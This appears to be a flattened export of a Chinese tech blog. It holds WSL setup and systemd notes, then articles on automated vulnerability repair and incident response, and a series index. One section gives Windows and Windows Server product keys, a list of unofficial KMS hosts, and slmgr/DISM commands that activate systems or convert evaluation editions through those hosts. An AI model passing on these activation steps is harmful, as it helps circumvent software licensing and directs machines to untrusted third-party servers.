Microsoft-Windows-Subsystem-Linux 升级 WSL 2 版本*** 必须升级，不升级很难用 *** dism.exe &#x2F;online &#x2F;enable-feature &#x2F;featurename:VirtualMachinePlatform &#x2F;all &#x2F;norestart wsl –update 安装 WSL 发行版 在 Windows 应用商店搜索 ubuntu wsl –install -d ubuntu-22.04 # 无法访问github下载镜像 WSL 命令12345678# 查看安装的版本wsl --list -v wsl -u root -d ubuntu-20.04 -e ls-u 指定用户-d 执行发行系统-e 执行命令 apt 换源12345678910111213141516171819sudo cp /etc/apt/sources.list /etc/apt/sources.list.baksudo bash -c &quot;cat &gt; /etc/apt/sources.list&quot; &lt;&lt; EOF# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse# 预发布软件源，不建议启用# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverseEOFsudo apt-get update 问题1234567891011我在 hyper-v 虚拟机中安装 wsl ，只能安装 wsl v1，无法运行 wsl v2, 所以只能在 wsl v1 安装和运行。# 错误代码: Wsl/InstallDistro/WSL_E_INSTALL_PROCESS_FAILED# Problem installing WSL: Error code: Wsl/WSL_E_DEFAULT_DISTRO_NOT_FOUND# https://github.com/microsoft/WSL/issues/9338# WslRegisterDistribution failed with error: 0x80370102# Please enable the Virtual Machine Platform Windows feature and ensure virtualization is enabled in the BIOS.I switched to version 1, installed Ubuntu, then switched to Version 2 and it works now!1- wsl --set-default-version 12- wsl.exe --install Ubuntu3- wsl --set-default-version 2 wsl –help123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173版权所有 (c) Microsoft Corporation。保留所有权利。有关此产品的隐私信息，请访问 https://aka.ms/privacy。用法: wsl.exe [参数] [选项...][命令行]运行 Linux 二进制文件的参数: 如果未提供命令行，wsl.exe 将启动默认 shell。 --exec, -e &lt;CommandLine&gt; 在不使用默认 Linux shell 的情况下执行指定的命令。 --shell-type &lt;standard|login|none&gt; 使用提供的 shell 类型执行指定的命令。 -- 按原样传递剩余的命令行。选项: --cd &lt;Directory&gt; 将指定目录设置为当前工作目录。 如果使用 ~，则将使用 Linux 用户的主路径。如果路径以 /字符开始，它将解释为绝对 Linux 路径。 否则，该值必须是绝对 Windows 路径。 --distribution, -d &lt;Distro&gt; 运行指定的分发版。 --user, -u &lt;UserName&gt; 以指定用户身份运行。 --system 为系统分发版启动 shell。用于管理适用于 Linux 的 Windows 子系统的参数: --help 显示使用情况信息。 --debug-shell 出于诊断目的打开 WSL2 调试 shell。 --install [发行版] [选项...] 安装适用于 Linux 的 Windows 子系统分发版。 有关有效分发版的列表，请使用 &#x27;wsl.exe --list --online&#x27;。 选项: --no-launch, -n 安装后不要启动分发版。 --web-download 从 Internet 而不是 Microsoft Store 下载分发版。 --no-distribution 仅安装所需的可选组件，不安装分发版。 --enable-wsl1 启用 WSL1 支持。 --manage &lt;Distro&gt; &lt;Options...&gt; 更改发行版特定选项。 选项: --set-sparse, -s &lt;true|false&gt; 将发行版的 vhdx 设置为稀疏，从而允许自动回收磁盘空间。 --mount &lt;Disk&gt; 在所有 WSL 2 分发版中附加和装载物理磁盘或虚拟磁盘。 选项: --vhd 指定 &lt;Disk&gt; 引用虚拟硬盘。 --bare 将磁盘附加到 WSL2，但不要装载它。 --name &lt;Name&gt; 使用装入点的自定义名称装载磁盘。 --type &lt;Type&gt; 装载磁盘时要使用的文件系统(如果未指定)默认为 ext4。 --options &lt;Options&gt; 其他装载选项。 --partition &lt;Index&gt; 要装载的分区的索引(如果未指定)默认为整个磁盘。 --set-default-version &lt;Version&gt; 更改新分发版的默认安装版本。 --shutdown 立即终止所有正在运行的分发版和 WSL 2 轻型实用工具虚拟机。 --status 显示适用于 Linux 的 Windows 子系统状态。 --unmount [磁盘] 从所有 WSL2 分发版中卸载和分离磁盘。 如果在没有参数的情况下调用，则卸载和分离所有磁盘。 --uninstall 从此计算机卸载适用于 Linux 的 Windows 子系统包。 --update 更新适用于 Linux 的 Windows 子系统包。 选项: --pre-release 下载预发行版本(如果可用)。 --version, -v 显示版本信息。用于在适用于 Linux 的 Windows 子系统中管理分发版的参数: --export &lt;Distro&gt; &lt;FileName&gt; [选项] 将分发版导出到 tar 文件。 文件名可以是 - for stdout。 选项: --vhd 指定应将分发版导出为 .vhdx 文件。 --import &lt;Distro&gt; &lt;InstallLocation&gt; &lt;FileName&gt; [选项] 将指定的 tar 文件作为新分发版导入。 文件名可以是 - for stdin。 选项: --version &lt;Version&gt; 指定要用于新分发的版本。 --vhd 指定所提供的文件是 .vhdx 文件，而不是 tar 文件。 此操作在指定的安装位置创建 .vhdx 文件的副本。 --import-in-place &lt;Distro&gt; &lt;FileName&gt; 将指定的 .vhdx 文件作为新分发版导入。 必须使用 ext4 文件系统类型设置此虚拟硬盘的格式。 --list, -l [选项] 列出分发版。 选项: --all 列出所有分发版，包括当前 正在安装或卸载的分发版。 --running 仅列出当前正在运行的分发版。 --quiet, -q 仅显示分发版名称。 --verbose, -v 显示有关所有分发版的详细信息。 --online, -o 显示适合通过 &#x27;wsl.exe --install&#x27; 安装的可用分发版列表。 --set-default, -s &lt;Distro&gt; 将分布版设置为默认值。 --set-version &lt;Distro&gt; &lt;Version&gt; 更改指定分发版的版本。 --terminate, -t &lt;Distro&gt; 终止指定的分发版。 --unregister &lt;Distro&gt; 取消注册分发版并删除根文件系统。 WSL 配置，启用 Systemd123456789101112# To enable, start your Ubuntu (or other Systemd) distribution under WSL.sudo -e /etc/wsl.conf# Add the following:[boot]systemd=true# Exit Ubuntu and again:wsl --shutdown# Then restart Ubuntu.sudo systemctl status WSL2 中 Systemd 处于降级状态的原因分析及解决方案 https://hydrotho.github.io/Analysis-Of-The-Causes-And-Solutions-Of-Systemd-In-Degraded-State-In-WSL2/ 123456789101112131415161718192021222324252627282930# 解决方案 创建 /etc/systemd/system/fix-shm.service&gt; sudo systemctl edit --force --full fix-shm.service&gt; systemctl cat fix-shm.service# /etc/systemd/system/fix-shm.service[Unit]Description=Fix /dev/shm IssueBefore=sysinit.targetDefaultDependencies=noConditionPathExists=/dev/shmConditionPathIsSymbolicLink=/dev/shmConditionPathIsMountPoint=/run/shm[Service]Type=oneshotExecStart=/usr/bin/rm /dev/shmExecStart=/bin/mount --bind -o X-mount.mkdir /run/shm /dev/shm[Install]WantedBy=sysinit.target# 开机自动启用单元&gt; sudo systemctl enable fix-shm.service# 立即终止所有正在运行的发行版和 WSL2 轻型实用程序虚拟机&gt; wsl --shutdown# 重新启动 WSL2 并查看 Systemd 状态&gt; systemctl status KMS激活Windows系统 https://www.cnblogs.com/yuyanc/p/18150937 在开始菜单上右键，选择 Windows PowerShell(管理员)，依次输入以下命令即可激活成功 123456789slmgr /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43 &amp;&amp; slmgr /skms kms.03k.org &amp;&amp; slmgr /atoslmgr /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43slmgr /skms kms.03k.orgslmgr /atoslmgr /upk ::卸载激活码slmgr /xpr ::查看过期时间 激活日算起半年slmgr.vbs -dlv ::命令可以看到激活后的使用期限为180天 Windows各版本的产品密钥 Win10企业版: NPPR9-FWDCX-D2C8J-H872K-2YT43 Win10专业版: W269N-WFGWX-YVC9B-4J6C9-T83GX Windows Server 2019 Datacenter: WMDGN-G9PQG-XVVXX-R3X43-63DFG Windows Server 2019 Standard: N69G4-B89J2-4G8F4-WWYCC-J464C Windows Server 2019 Essential: WVDHN-86M7X-466 P 6-VHXV7-YY726 KMS服务器需要ping测试是否有效 1234567891011zh.us.tokms.03k.orgkms.chinancce.comkms.shuax.comkms.dwhd.orgkms.luody.infokms.digiboy.irkms.lotro.ccss.yechiu.xinwww.zgbs.cccy2617.jios.org Windows Server 2022 KMS激活序列号 https://www.orcy.net.cn/1882.html 1234567891011121314151617# 激活教程# 以管理员身份运行powershell或cmd，输入以下命令激活 （序列号替换如上对应的版本批量授权密钥）# 以数据中心版为例，KMS激活server2022命令：slmgr -ipk WX4NM-KYWYW-QJJR4-XV3QB-6VM33slmgr -skms kms.0t.net.cnslmgr -ato# KMS服务器: kms.0t.net.cn# Windows Server2022序列号# Server2022 零售版：RGN6B-MCPWX-6K6GK-HKM33-7VCXY - Standard 标准版（非图形界面和桌面体验）DNVBD-FCT8Y-TQT8Q-HGQ34-QGRRV - Datacenter 数据中心版（非图形界面和桌面体验）# Server2022 批量授权版：VDYBN-27WPP-V4HQT-9VMD4-VMK7H - Standard 标准版（非图形界面和桌面体验）WX4NM-KYWYW-QJJR4-XV3QB-6VM33 - Datacenter 数据中心版（非图形界面和桌面体验） WindowsServer评估版转为正式版并激活一般从官网下载的Windows Server版本都是评估试用版本。这时候想转为正式版本，就需要使用转换激活代码。请参照不同的版本使用不同的代码。注意：以下代码请以管理员身份运行。 12345678910111213141516171819202122232425262728293031323334353637383940414243# Windows Server 2016标准版## 先执行下列命令将评估版转为正式版本：DISM /online /Set-Edition:ServerStandard /ProductKey:WC2BQ-8NRM3-FDDYY-2BFGV-KHKQY /AcceptEula# 转换完成后，系统可能提示需要重启，重启完成后，使用下列代码进行激活系统：slmgr.vbs /upkslmgr /skms kms.chinancce.comslmgr /ipk P96NB-8TJQB-BW47F-TQRMX-T839Rslmgr /ato# Windows Server 2016数据中心版## 先执行下列命令将评估版转为正式版本：DISM /online /Set-Edition:ServerDatacenter /ProductKey:CB7KF-BWN84-R7R2Y-793K2-8XDDG /AcceptEula# 转换完成后，系统可能提示需要重启，重启完成后，使用下列代码进行激活系统：slmgr.vbs /upkslmgr /skms kms.chinancce.comslmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GXslmgr /ato# Windows Server 2019标准版## 先执行下列命令将评估版转为正式版本：DISM /online /Set-Edition:ServerStandard /ProductKey:N69G4-B89J2-4G8F4-WWYCC-J464C /AcceptEula# 转换完成后，系统可能提示需要重启，重启完成后，使用下列代码进行激活系统：slmgr.vbs /upkslmgr /skms kms.chinancce.comslmgr /ipk N69G4-B89J2-4G8F4-WWYCC-J464Cslmgr /ato# Windows Server 2019数据中心版## 先执行下列命令将评估版转为正式版本：DISM /online /Set-Edition:ServerDatacenter /ProductKey:WMDGN-G9PQG-XVVXX-R3X43-63DFG /AcceptEula# 转换完成后，系统可能提示需要重启，重启完成后，使用下列代码进行激活系统：slmgr.vbs /upkslmgr /skms kms.chinancce.comslmgr /ipk WMDGN-G9PQG-XVVXX-R3X43-63DFGslmgr /ato Windows Server 2022 系统评估版转为正式版方法 https://gclz.cn/post/737/ 1234567891011121314151617181920212223242526271、管理员模式运行cmd,输入命令:DISM /online /Get-CurrentEdition，得到结果：C:\\Users\\Administrator&gt;DISM /online /Get-CurrentEdition部署映像服务和管理工具版本: 10.0.20348.1映像版本: 10.0.20348.202当前版本为:当前版本 : ServerDatacenterEval操作成功完成。其中ServerDatacenterEval去掉Eval后，就是当前的Edition ID2、输入命令升级Windows Server 2022 数据中心版的例子，如果是其他版本，需要替换掉对应的key和Edition，运行结果如下：C:\\Users\\Administrator&gt;DISM /online /Set-Edition:ServerDatacenter /ProductKey:WX4NM-KYWYW-QJJR4-XV3QB-6VM33 /AcceptEula部署映像服务和管理工具版本: 10.0.20348.1映像版本: 10.0.20348.202开始升级组件...开始安装产品密钥...产品密钥安装已完成。正在添加程序包 Microsoft-Windows-ServerDatacenterEdition~31bf3856ad364e35~amd64~~10.0.20348.169[==========================100.0%==========================]组件升级已完成。重新启动 Windows 就变成正式版了。 WindowsServer 2019 Active123456789101112131415161718## 方式1、slmgr /upkslmgr /ipk N69G4-B89J2-4G8F4-WWYCC-J464Cslmgr /skms kms.v0v.bidslmgr /ato## 方式2slmgr /ipk WMDGN-G9PQG-XVVXX-R3X43-63DFGslmgr /skms kms.v0v.bidslmgr /atoslmgr /xpr## 方式3slmgr /ipk WMDGN-G9PQG-XVVXX-R3X43-63DFGslmgr /skms zh.us.toslmgr /atoslmgr /xpr","tags":["操作系统","Windows"],"categories":["基础工具"]},{"title":"软件代码漏洞自动化修复技术","path":"/2020/01/03/secbook/software-code-vulnerability-automated-repair-technology/","content":"一、背景随着信息技术的发展，众多研发人员开发的大量信息系统，形成了人们日常生活越来越依赖的庞大的互联网体系，已成为整个社会的基础设施且越来越重要。保护信息系统的安全需要对组成信息系统的代码加强防护是非常重要的。在软件代码开发环节实施安全检测修复和管理是一种保护信息系统安全的重要方法。 软件代码开发流程中的安全检测和修复工作，大多是通过开发人员将软件代码提交到代码库后进行自动化安全检查，实时监控代码库新提交的软件代码的事件并拉取相应代码数据，然后通过代码特征分析后与安全编码规则进行比对，发现和定位软件代码存在的安全缺陷和风险，发出漏洞报告通知开发人员修补漏洞，缺乏相应自动化修复手段。 二、软件代码漏洞修复现状目前，一旦发现软件代码存在的安全缺陷和风险，开发人员需要了解该漏洞风险和修复方法，然后编写补丁代码并提交到代码库，通过人工手动完成修复。由于软件新功能新需求不断迭代代码量庞大，还有开发人员流动性导致经常修改他人的代码且安全漏洞种类繁多，这种方法不仅工作量大且繁琐，还严重耗费大量时间和人力等资源。 三、软件代码漏洞自动化修复方案本技术方案提供一种基于安全编码规范的软件代码漏洞自动修复方法，包括预先根据安全编码规范建立的安全编码规则库，然后基于漏洞检查模块执行代码拉取检测和修复过程。 自动化修复技术优势根据不同等级漏洞修复时间要求：严重漏洞1天修复、高危漏洞3天修复、中危漏洞7天修复、低危漏洞14天修复，一个软件漏洞修复平均时间五天左右，通过软件漏洞自动化修复过程能够在小时级别完成漏洞修复。 根据不同软件开发人员的技术水平、不安全代码的熟悉程度和对漏洞种类的熟悉程度，平均修复一个软件漏洞消耗人力0.5人天，通过软件漏洞自动化修复过程近乎无人力消耗。 自动化修复流程示意图 所述安全编码规则库包含软件代码开发安全编码规范所涉及安全规则项的基本信息，每个安全规则项的基本信息包括安全规则项名称、安全规则项特征值、安全补丁修复代码，针对不同编程语言分别能够采用的安全规则检测方法及相应指令、安全漏洞修复方法及相应指令，和用于唯一标示安全规则项名称的安全规则项编号。 所述检查过程，包括根据安全编码规则项名称和编程语言类型确定漏洞检查方法及指令，实时拉取软件代码数据；逐个将拉取到的代码文件与安全编码规范库中的相应安全规则项进行比对，对不满足安全编码规则特征值的软件代码确定为安全漏洞，并把安全漏洞保存在安全漏洞库中，得到漏洞数据； 所述安全漏洞库包含安全漏洞的基本信息，每个安全漏洞的基本信息中包括安全漏洞项名称、拉取的软件代码文件，和于安全编码规则项编号一致的安全漏洞编号。 所述修复过程，包括当安全漏洞库中有未修复的安全漏洞时，从安全漏洞库获取安全漏洞，根据安全漏洞编号从安全编码规则库获取相应安全规则项的安全补丁修复代码，并根据安全漏洞编号和编程语言类型确定漏洞修复方法及指令，对存在漏洞的代码修复为安全补丁修复代码。 而且，对于每个安全规范规则项，各种编程语言类型分别能够采用的漏洞检查方法为以下四种之一， ●读取代码文件哈希值，如md5值 ●读取应用依赖软件的版本号 ●读取软件代码块信息 ●读取应用配置文件信息 而且，对于每个安全编码规则项，各种编程语言类型分别能够采用的漏洞修复方法为以下四种之一， ●替换存在漏洞的代码文件 ●修改依赖软件的版本号 ●替换存在漏洞的代码块 ●修改应用软件配置文件 四、总结随着DevOps持续集成部署流程不断发展，已被所有互联网厂商应用，DevSecOps持续集成中的安全检测流程已经是互联网各大厂开始探索和布局落地，该方案目前还未有相关的概念和方法被提出，由于该方案能以十倍到百倍地减少漏洞修复时间和人工成本，具备被广泛应用的市场规模和前景。","categories":["攻防兼备企业安全实践"]},{"title":"网络安全事件应急响应","path":"/2020/01/02/secbook/security-incident-response/","content":"网络安全应急响应的目标是在网络安全事件发生时，快速有效地应对和处理事件，保障网络安全，避免或减少事件造成的损害。网络安全应急响应的范围包括网络安全事件的发生、应对和处理，以及相关责任人员、流程、工具和资源。网络安全事件可能包括网络攻击、网络灾难和网络故障等。网络安全应急响应需要与企业的灾难恢复和应急预案相结合，以保证网络安全事件的有效处理。 安全突发事件的级别和类型安全事件级别●一般级别：涉及个人信息或少量数据泄露，对组织或个人造成的影响较小，需要进行一般的调查和应对措施。 ●较大级别：涉及重要信息或大量数据泄露，对组织或个人造成的影响较大，需要进行全面的调查和应对措施。 ●重大级别：涉及组织或国家重要信息或数据泄露，对组织或个人造成的影响极大，需要采取紧急措施并深入调查。 ●特别重大级别：涉及国家安全和国民利益的严重威胁，需要采取最严格的安全措施和应急响应措施。 安全事件类型●病毒、木马、间谍软件等恶意代码攻击事件，这类事件可能会破坏系统的完整性和可用性。 ●拒绝服务攻击事件，这类事件可能会导致网络或网络设备的过载，导致网络和系统的瘫痪。 ●数据泄露事件，这类事件可能会导致机密信息或个人数据泄露，导致组织和个人的合法权益受损。 ●网络渗透攻击事件，这类事件可能会导致网络系统被黑客攻陷，获取组织的敏感信息。 ●社工攻击事件, 这类事件可能会导致骗取个人信息等。 网络安全应急响应小组1组建核心成员：确定应急响应小组的核心成员，包括安全专家、IT技术人员、法律顾问、风险管理人员等。 2制定职责分工：明确每个成员的职责和权限，确保在事件发生时能够有效协调。 3建立沟通机制：建立内部沟通机制和外部沟通机制，确保在事件发生时能够迅速获取信息。 4定期培训和演练：定期进行培训和演练，确保应急响应小组能够熟练掌握应急响应流程和计划。 5定期评估和改进：定期评估应急响应小组的工作效率和效果，并不断改进应急响应流程和计划。 网络安全事件处置流程1事件发现: 通过安全监控和日常安全检查等手段，发现网络安全事件。包括使用安全软件和硬件，如防火墙、入侵检测系统、入侵防御系统等，以及进行安全审计和日常网络扫描。 2事件识别: 对发现的事件进行识别，确定事件类型和范围。识别事件的类型是为了采取适当的响应措施。确定事件范围是为了评估事件的严重程度和影响范围。 3事件确认: 进一步确认事件是否属实，并对事件进行评估，确定事件的严重程度。进行深入的分析，以确定事件的真实性和影响范围。 4事件响应: 根据事件的严重程度和影响范围，采取适当的应急措施。响应措施包括紧急关闭漏洞服务、隔离受感染系统、清除恶意软件、恢复系统等。 5事件分析: 分析事件的原因和脉络，确定事件来源和责任人。进行详细的日志分析和数据挖掘，以确定事件的起因和责任人。 6事件处理: 按照事件的类型和严重程度，采取适当的处理措施。包括对恶意软件进行清除、重新配置系统、对漏洞进行修补等。 7事件追踪: 追踪事件的后果和影响，并对组织进行风险评估。对事件的影响进行评估，并对组织相关的潜在的类似风险进行评估。 8事件报告: 对事件进行详细报告，并向相关部门和领导汇报。准确的汇报事件的详细信息，并向相关部门和领导汇报。 9事件预防: 根据事件分析和追踪结果，采取预防措施防范未来可能发生的类似事件。包括安全政策和程序的修订、培训员工、升级网络安全系统等。 10事件评估: 对事件处理过程进行评估，以确定哪些地方需要改进。 这可能包括评估响应时间、处理效率、沟通效率等。根据评估结果，可以改进应急响应流程，以更好地应对未来网络安全事件。 网络安全应急响应演练事件预案针对不同类型的网络安全事件，制定明确的应对措施和流程，以便在事件发生时能够迅速有效地响应。 事件演习定期进行演习，以检验应急响应计划的可行性和有效性，并对其进行修订。 事件培训为应急响应团队和其他相关人员提供培训，以确保他们能够在事件发生时进行有效响应。 网络安全应急响应资源支持1人员资源：包括应急响应小组的成员、值班人员、专家顾问等。 2技术资源：包括应急响应工具、网络监测和分析系统、安全系统等。 3信息资源：包括网络安全威胁情报、应急响应文档、应急响应计划等。 4物资资源：包括应急响应用的备件、工具、设备等。 5财务资源：包括应急响应所需的经费、预算等。 6外部资源：包括其他机构、单位和专家等外部资源。 《国家网络安全事件应急预案》 https://www.cac.gov.cn/2017-06/27/c_1121220113.htm 安全应急响应白皮书 https://help.aliyun.com/zh/mss/security-emergency-response-service-white-paper","categories":["攻防兼备企业安全实践"]},{"title":"《攻防兼备企业安全实践系列》目录","path":"/2020/01/01/secbook/secbook-index/","content":"前言随着信息化和数字化的发展，这些年安全行业在快速变化，AI安全、大数据安全、云安全、物联网安全、车联网安全、工控安全预示着一个无边无际的广阔安全前景。千里之行始于足下，浮躁的环境、艰难的道路，我们必须坚持原则才能走的更远。 安全的底层技术原理和基础安全方案，仍然是安全发展的重要基石，踏实地走好每一步。 没有深刻反思的安全大厦是空中楼阁，不要陷入自己想象中的安全。 攻防对抗能力不断演变螺旋上升，未来的安全将是一种兼具进可攻与退可守的主动式防御体系。 笔者从一名早期安全厂商的工程师做起，到互联网时代从0到1探索企业安全建设，再到云时代负责一整套十万级规模公有云数据中心的安全运行。做过安全产品开发、安全服务、等保测评、安全管理合规、安全系统建设、安全运营、事件响应、攻防实战等各个方面，可以算是有一些综合经验积累的安全人了。 笔者计划将十多年的大型企业安全建设实践经验，总结输出一系列文章《攻防兼备的企业安全实践》。才疏学浅功底有限，但还是想通过这种方式鞭策自己，把大脑中的思考通过文字表达提炼出来，才能不断精进前进。希望为保护网络世界的安全贡献一份薄力，对更多安全从业者有所启发和帮助。欢迎志同道合的朋友，一起踏上安全领域的神奇旅途。 目录【网络安全纵深防御】 全链路纵深防御安全方案 网络安全事件应急响应 【安全合规及风险管理】 网络安全法律法规 信息安全管理体系建设 企业信息安全意识培训 【数据安全与隐私保护】 数据安全保护体系 个人信息保护安全防范 【安全开发生命周期】 软件开发安全生命周期DevSecOps安全方案 软件代码漏洞自动化修复技术 【终端与身份安全】 终端安全与远程办公 零信任安全架构 【云数据中心安全】 云安全框架及虚拟化技术 云计算服务重大安全风险评估 企业级容器安全风险与最佳实践 【安全攻防实战演练】 红蓝对抗网络攻防实战演练 钓鱼攻击演练方案 白帽子渗透行为监控方案 【移动与物联网安全】 移动支付与支付安全 SDL IoT 物联网安全架构设计方案","categories":["攻防兼备企业安全实践"]}]